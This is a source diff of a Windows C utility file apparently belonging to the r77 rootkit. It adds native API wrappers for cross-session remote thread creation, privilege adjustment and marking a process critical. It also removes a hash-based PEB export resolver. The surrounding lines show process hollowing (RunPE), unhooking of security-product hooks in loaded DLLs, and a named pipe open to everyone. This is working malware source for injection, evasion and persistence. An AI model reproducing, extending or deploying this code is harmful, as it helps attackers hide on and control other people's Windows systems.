@@ -1,5 +1,4 @@
 #include "r77win.h"
-#include "r77runtime.h"
 #include "ntdll.h"
 #include <Psapi.h>
 #include <Shlwapi.h>
@@ -65,7 +64,7 @@ LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str)
 	if (str.Buffer)
 	{
 		PWCHAR buffer = NEW_ARRAY(WCHAR, str.Length / sizeof(WCHAR) + 1);
-		libc_wmemcpy(buffer, str.Buffer, str.Length / sizeof(WCHAR));
+		i_wmemcpy(buffer, str.Buffer, str.Length / sizeof(WCHAR));
 		buffer[str.Length / sizeof(WCHAR)] = L'\0';
 
 		return buffer;
@@ -74,6 +73,35 @@ LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str)
 	{
 		return NULL;
 	}
+}
+VOID Int32ToStrW(LONG value, PWCHAR buffer)
+{
+	if (value == 0)
+	{
+		buffer[0] = L'0';
+		buffer[1] = L'\0';
+		return;
+	}
+
+	if (value < 0)
+	{
+		*buffer++ = L'-';
+		value = -value;
+	}
+
+	INT length = 0;
+	for (LONG i = value; i; i /= 10)
+	{
+		length++;
+	}
+
+	for (INT i = 0; i < length; i++)
+	{
+		buffer[length - i - 1] = L'0' + value % 10;
+		value /= 10;
+	}
+
+	buffer[length] = L'\0';
 }
 
 BOOL Is64BitOperatingSystem()
@@ -354,8 +382,8 @@ BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile)
 
 	STARTUPINFOW startupInfo;
 	PROCESS_INFORMATION processInformation;
-	libc_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
-	libc_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
+	i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
+	i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
 	startupInfo.cb = sizeof(startupInfo);
 
 	if (CreateProcessW(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation))
@@ -610,7 +638,7 @@ HANDLE CreatePublicNamedPipe(LPCWSTR name)
 	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return INVALID_HANDLE_VALUE;
 
 	EXPLICIT_ACCESSW explicitAccess;
-	libc_memset(&explicitAccess, 0, sizeof(EXPLICIT_ACCESSW));
+	i_memset(&explicitAccess, 0, sizeof(EXPLICIT_ACCESSW));
 	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
 	explicitAccess.grfAccessMode = SET_ACCESS;
 	explicitAccess.grfInheritance = NO_INHERITANCE;
@@ -653,43 +681,6 @@ BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
 
 	return FALSE;
 }
-LPVOID PebGetProcAddress(DWORD moduleHash, DWORD functionHash)
-{
-#ifdef _WIN64
-	PNT_PEB_LDR_DATA peb = (PNT_PEB_LDR_DATA)((PNT_PEB)__readgsqword(0x60))->Ldr;
-#else
-	PNT_PEB_LDR_DATA peb = (PNT_PEB_LDR_DATA)((PNT_PEB)__readfsdword(0x30))->Ldr;
-#endif
-
-	PNT_LDR_DATA_TABLE_ENTRY firstPebEntry = (PNT_LDR_DATA_TABLE_ENTRY)peb->InMemoryOrderModuleList.Flink;
-	PNT_LDR_DATA_TABLE_ENTRY pebEntry = firstPebEntry;
-	do
-	{
-		// Find module by hash
-		if (pebEntry->BaseDllName.Buffer && libc_strhashi((LPCSTR)pebEntry->BaseDllName.Buffer, pebEntry->BaseDllName.Length) == moduleHash)
-		{
-			LPBYTE dllBase = (LPBYTE)pebEntry->DllBase;
-			PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
-			PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-			LPDWORD nameDirectory = (LPDWORD)(dllBase + exportDirectory->AddressOfNames);
-			LPWORD nameOrdinalDirectory = (LPWORD)(dllBase + exportDirectory->AddressOfNameOrdinals);
-
-			// Find function by hash
-			for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++, nameDirectory++, nameOrdinalDirectory++)
-			{
-				if (libc_strhash((LPCSTR)(dllBase + *nameDirectory)) == functionHash)
-				{
-					return dllBase + *(LPDWORD)(dllBase + exportDirectory->AddressOfFunctions + *nameOrdinalDirectory * sizeof(DWORD));
-				}
-			}
-
-			return NULL;
-		}
-	}
-	while ((pebEntry = (PNT_LDR_DATA_TABLE_ENTRY)pebEntry->InMemoryOrderModuleList.Flink) != firstPebEntry);
-
-	return NULL;
-}
 BOOL RunPE(LPCWSTR path, LPBYTE payload)
 {
 	// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
@@ -703,8 +694,8 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 		{
 			STARTUPINFOW startupInfo;
 			PROCESS_INFORMATION processInformation;
-			libc_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
-			libc_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
+			i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
+			i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
 			startupInfo.cb = sizeof(startupInfo);
 
 			if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
@@ -839,7 +830,7 @@ VOID UnhookDll(LPCWSTR name)
 		if (dll)
 		{
 			MODULEINFO moduleInfo;
-			libc_memset(&moduleInfo, 0, sizeof(MODULEINFO));
+			i_memset(&moduleInfo, 0, sizeof(MODULEINFO));
 
 			if (GetModuleInformation(GetCurrentProcess(), dll, &moduleInfo, sizeof(MODULEINFO)))
 			{
@@ -868,7 +859,7 @@ VOID UnhookDll(LPCWSTR name)
 
 									DWORD oldProtect;
 									VirtualProtect(virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-									libc_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
+									i_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
 									VirtualProtect(virtualAddress, virtualSize, oldProtect, &oldProtect);
 
 									break;
@@ -886,4 +877,38 @@ VOID UnhookDll(LPCWSTR name)
 			FreeLibrary(dll);
 		}
 	}
+}
+
+NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
+{
+	// NtQueryObject must be called by using GetProcAddress on Windows 7.
+	return ((NT_NTQUERYOBJECT)GetFunction("ntdll.dll", "NtQueryObject"))(handle, objectInformationClass, objectInformation, objectInformationLength, returnLength);
+}
+NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer)
+{
+	// Use NtCreateThreadEx instead of CreateRemoteThread.
+	// CreateRemoteThread does not work across sessions in Windows 7.
+	return ((NT_NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
+}
+NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue)
+{
+	return ((NT_RTLADJUSTPRIVILEGE)GetFunction("ntdll.dll", "RtlAdjustPrivilege"))(privilege, enablePrivilege, isThreadPrivilege, previousValue);
+}
+NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
+{
+	return ((NT_RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
+}
+BOOL R77_IsWindows10OrGreater()
+{
+	// This function must re-written in order to be compatible with /NODEFAULTLIB
+
+	OSVERSIONINFOEXW versionInfo;
+	i_memset(&versionInfo, 0, sizeof(OSVERSIONINFOEXW));
+	versionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
+	versionInfo.dwMajorVersion = HIBYTE(_WIN32_WINNT_WIN10);
+	versionInfo.dwMinorVersion = LOBYTE(_WIN32_WINNT_WIN10);
+	versionInfo.wServicePackMajor = 0;
+
+	DWORDLONG conditionMask = VerSetConditionMask(VerSetConditionMask(VerSetConditionMask(0, VER_MAJORVERSION, VER_GREATER_EQUAL), VER_MINORVERSION, VER_GREATER_EQUAL), VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);
+	return VerifyVersionInfoW(&versionInfo, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, conditionMask) != FALSE;
 }
